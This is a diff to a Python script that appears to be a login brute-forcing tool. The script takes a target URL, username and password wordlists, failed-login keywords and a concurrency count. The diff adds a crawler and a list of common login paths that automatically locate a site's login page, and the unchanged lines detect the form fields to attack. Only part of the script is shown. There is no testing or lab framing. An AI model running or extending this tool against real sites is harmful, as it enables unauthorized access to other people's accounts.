@@ -5,14 +5,25 @@ import time
 import logging
 import requests
 from bs4 import BeautifulSoup
+from urllib.parse import urljoin, urlparse
 
 # Configure logging
 logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(message)s')
 
 # User inputs
-TARGET_URL = input("Enter the target login URL: ").strip()
+BASE_URL = input("Enter the target login URL: ").strip()
 USE_USERNAME_WORDLIST = input("Use a username wordlist? (yes/no): ").strip().lower() == "yes"
 USE_PASSWORD_WORDLIST = input("Use a password wordlist? (yes/no): ").strip().lower() == "yes"
+
+# Common login paths
+COMMON_LOGIN_PATHS = [
+    "/login", "/signin", "/auth", "/user/login", 
+    "/account/login", "/admin/login",
+    "/login.php", "/signin.php", "/auth.php", 
+    "/login.html", "/signin.html", "/auth.html",
+    "/login.aspx", "/signin.aspx", "/auth.aspx",
+    "/user/login.php", "/account/login.php", "/admin/login.php"
+]
 
 # Load wordlists
 def load_wordlist(filepath):
@@ -41,6 +52,55 @@ else:
 ERROR_INDICATORS = input("Enter all keywords indicating failed login (comma-separated): ").strip().lower().split(',')
 
 CONCURRENT_REQUESTS = int(input("Enter the number of concurrent requests: "))
+
+# Auto-navigate login page
+def discover_login_page(base_url):
+    """Attempt to discover the login page on the website"""
+    logging.info(f"[+] Attempting to discover the login page on {base_url}")
+    visited_urls = set()
+    urls_to_check = [base_url]
+    
+    while urls_to_check:
+        current_url = urls_to_check.pop(0)
+        if current_url in visited_urls:
+            continue
+        visited_urls.add(current_url)
+        
+        try:
+            response = requests.get(current_url, timeout=5)
+            if response.status_code != 200:
+                continue
+            
+            html = response.text
+            soup = BeautifulSoup(html, 'html.parser')
+
+            # Search for links that look like login pages
+            for a_tag in soup.find_all('a', href=True):
+                href = a_tag['href'].lower()
+                full_url = urljoin(base_url, href)
+                if any(keyword in href for keyword in ["login", "signin", "auth"]):
+                    logging.info(f"[+] Found potential login page: {full_url}")
+                    return full_url
+                # Add internal links to check list
+                if urlparse(full_url).netloc == urlparse(base_url).netloc:
+                    urls_to_check.append(full_url)
+        
+        except requests.exceptions.RequestException as e:
+            logging.error(f"⚠️ Error while crawling {current_url}: {e}")
+    
+    # If no login links are found, check common login paths
+    for path in COMMON_LOGIN_PATHS:
+        potential_login_url = urljoin(base_url, path)
+        try:
+            response = requests.get(potential_login_url, timeout=5)
+            if response.status_code == 200:
+                logging.info(f"[+] Login page found at: {potential_login_url}")
+                return potential_login_url
+        except requests.exceptions.RequestException as e:
+            logging.warning(f"[!] Could not connect to {potential_login_url}: {e}")
+
+    logging.warning("[!] No login page found automatically. Using the base URL.")
+    return base_url
 
 # Detect login fields dynamically
 def detect_login_fields(url):
@@ -97,6 +157,10 @@ def detect_login_fields(url):
     except requests.exceptions.RequestException as e:
         logging.error(f"⚠️ Error fetching login page: {e}")
         return None
+        
+# Get login url
+TARGET_URL = discover_login_page(BASE_URL)
+logging.info(f"[+] Using login url: {TARGET_URL}")
 
 # Get dynamic login form fields
 detected_fields = detect_login_fields(TARGET_URL)
